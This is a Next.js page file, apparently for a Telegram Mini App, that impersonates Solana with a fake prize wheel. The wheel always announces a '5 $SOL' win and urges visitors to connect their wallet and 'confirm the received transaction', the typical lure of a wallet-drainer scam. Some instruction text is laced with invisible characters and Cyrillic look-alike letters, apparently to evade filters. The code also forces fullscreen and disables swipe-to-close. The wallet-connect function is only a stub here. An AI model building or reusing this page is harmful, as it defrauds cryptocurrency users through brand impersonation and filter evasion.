// app/page.tsx
"use client";

import React, { useEffect, useRef, useState } from "react";
import "./assets/2idql.css"; // Tasarım CSS’i

// ——— Telegram WebApp için kullandığımız fonksiyonları tanımlıyoruz ———
type TgWebApp = {
  expand: () => void;
  setHeaderColor: (color: string) => void;
  setBackgroundColor: (color: string) => void;
  disableVerticalSwipes?: () => void;
  scroll?: (offsetY: number) => void;
};

type TgWindow = Window & {
  Telegram?: {
    WebApp?: TgWebApp;
  };
};

// ---------------------------------------------------
// Yardımcı fonksiyon – (şimdilik) cüzdan modalı açma
const openModal = () => {
  console.log("openModal() henüz bağlanmadı.");
};

const Page = () => {
// ——— Telegram Mini-App init ———
useEffect(() => {
  const webapp = (window as TgWindow).Telegram?.WebApp;
  if (!webapp) return;

  try {
    /* 1)  Tam ekran (yeni API: requestFullscreen)  */
    if (typeof (webapp as any).requestFullscreen === 'function') {
      // > Bot API 7.8+ (2024) — gerçek full-screen
      (webapp as any).requestFullscreen();
    } else {
      // > Eski sürümler: sadece expand (üst bar kalır)
      webapp.expand();
    }

    /* 2) Tema renklerini siyah yap */
    webapp.setHeaderColor('#000000');
    webapp.setBackgroundColor('#000000');

    /* 3) Dikey “swipe-to-close” hareketini devre dışı bırak */
    if (typeof webapp.disableVerticalSwipes === 'function') {
      webapp.disableVerticalSwipes();
    } else {
      /*  ↓ Eski fallback: kaydırmayı sıfıra sabitle */
      const scrollFn = webapp.scroll;
      if (typeof scrollFn === 'function') {
        const onScroll = () => scrollFn(window.scrollY);
        window.addEventListener('scroll', onScroll);
        return () => window.removeEventListener('scroll', onScroll);
      }
    }
  } catch (err) {
    console.error('Telegram WebApp init hatası:', err);
  }
}, []);

 /* eslint-disable @typescript-eslint/no-this-alias */

  // ---------- ÇARK (spin) durumu ----------
  const wheelRef = useRef<HTMLImageElement>(null);

  const [hasSpun, setHasSpun] = useState<boolean>(() => {
    if (typeof window === "undefined") return false;
    return localStorage.getItem("hasSpun") === "true";
  });

  // Spin bittikten sonra “modal_active” ekle
  useEffect(() => {
    const hero = document.querySelector("._1");
    if (hasSpun) {
      hero?.classList.add("modal_active");
    }
  }, [hasSpun]);

  // Spin butonuna basılınca
  const handleSpin = () => {
    if (hasSpun || !wheelRef.current) return;

    const wheel = wheelRef.current;
    wheel.style.transition = "transform 9000ms ease-in-out";
    wheel.style.transform = "rotate(1080deg)"; // 3 tur

    // 9 s sonra sıfırla
    setTimeout(() => {
      wheel.style.transition = "none";
      wheel.style.transform = "rotate(0deg)";
    }, 9000);

    // 10 s sonra modal & localStorage
    setTimeout(() => {
      setHasSpun(true);
      localStorage.setItem("hasSpun", "true");
    }, 10000);
  };

  return (
    <>
      {/* ---------- HERO BANNER ---------- */}
      <div className="_1">
        <div className="_g">
          <span className="_a">
            <div className="_3">
              <p className="_7">
                CONGRATULATIONS! <br />
                <span className="_a">You won</span>{" "}
                <span>
                  <span className="_a">5 $SOL</span>
                </span>
              </p>
            </div>
          </span>

          <div className="_9">
            <div className="_i">
              <p className="_k">Connect your wallet to receive reward</p>
              <button onClick={openModal} className="_s">
                CLAIM REWARD
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* ---------- HEADER ---------- */}
      <section className="_b">
        <span className="_a">
          <div className="_d">
            <div className="_x">
              <div className="_0">
                <a href="#!" className="_h">
                  <img src="/header_logo.svg" alt="Solana logo" />
                </a>
                <a href="#!" className="_w">
                  <img src="/alik.png" className="_t" alt="" />
                </a>
              </div>

              <div className="_0">
                <div className="_6">
                  <a
                    href="https://x.com/solana?mx=2"
                    target="_blank"
                    className="_q"
                    rel="noreferrer"
                  >
                    <img src="/header_twitter.svg" alt="Twitter / X" />
                  </a>
                  <a
                    href="https://t.me/solana"
                    target="_blank"
                    className="_q"
                    rel="noreferrer"
                  >
                    <img src="/header_tg.svg" alt="Telegram" />
                  </a>
                  <a
                    href="https://www.youtube.com/SolanaFndn"
                    target="_blank"
                    className="_q"
                    rel="noreferrer"
                  >
                    <img src="/header_mail.svg" alt="YouTube" />
                  </a>
                  <a
                    href="https://discord.com/invite/kBbATFA7PW"
                    target="_blank"
                    className="_q"
                    rel="noreferrer"
                  >
                    <img src="/header_ds.svg" alt="Discord" />
                  </a>
                </div>
              </div>

              <div className="_0">
                <button onClick={openModal} className="_n">
                  <span className="_a">Connect Wallet</span>
                  <img src="/header_arrow.svg" alt="" />
                </button>
              </div>
            </div>
          </div>
        </span>
      </section>

      {/* ---------- MAIN SECTION ---------- */}
      <section className="_m">
        <div className="_d">
<h1 className="_4">
  WELCOME <span>BONUS</span>
  <br />
  FOR SOLANA USERS
</h1>

          <span className="_a">
            <div className="_o">
              <span className="_a">
                <div className="_r">
                  <img src="/wheel_arrow.png" alt="" className="_f" />
                  <img
                    ref={wheelRef}
                    src="/wheel_wheel.png"
                    alt="Wheel"
                    className="_l"
                    id="_8"
                  />
                  <button className="_y" id="_c" onClick={handleSpin}>
                    <span className="_a">FREE SPIN</span>
                  </button>
                </div>
              </span>
            </div>
          </span>

          <div className="_u">
            <div className="_j">
              <p className="_p">
                <img src="/main_one.svg" alt="" />
                If you have received a qualification notification in the form of
                SOL or USDT, click the «FREE SPIN» button
              </p>
              <p className="_p">
                <img src="/main_two.svg" alt="" />
                ​If⁣ уоu win rеwar⁣d​ in f‌⁢⁣rе‌e sp‍i‍n, ​‍w⁢е c‍ongr​аtulаtе
                yо⁣u!
              </p>
              <p className="_p">
                <img src="/main_three.svg" alt="" />
                <span className="_a">
                  Click «CLAIM REWARD», connect your wallet and confirm the
                  received transaction
                </span>
              </p>
            </div>
            <p className="_e">All rights reserved © 2025 SOLANA.</p>
          </div>
        </div>
      </section>

      {/* ---------- FOOTER SOCIAL ---------- */}
      <section className="_v">
        <div className="_d">
          <div className="_6">
            <a
              href="https://x.com/solana?mx=2"
              target="_blank"
              className="_q"
              rel="noreferrer"
            >
              <img src="/header_twitter.svg" alt="Twitter" />
            </a>
            <a
              href="https://t.me/solana"
              target="_blank"
              className="_q"
              rel="noreferrer"
            >
              <img src="/header_tg.svg" alt="Telegram" />
            </a>
            <a
              href="https://www.youtube.com/SolanaFndn"
              target="_blank"
              className="_q"
              rel="noreferrer"
            >
              <img src="/header_mail.svg" alt="YouTube" />
            </a>
            <a
              href="https://discord.com/invite/kBbATFA7PW"
              target="_blank"
              className="_q"
              rel="noreferrer"
            >
              <img src="/header_ds.svg" alt="Discord" />
            </a>
          </div>
        </div>
      </section>
    </>
  );
};

export default Page;
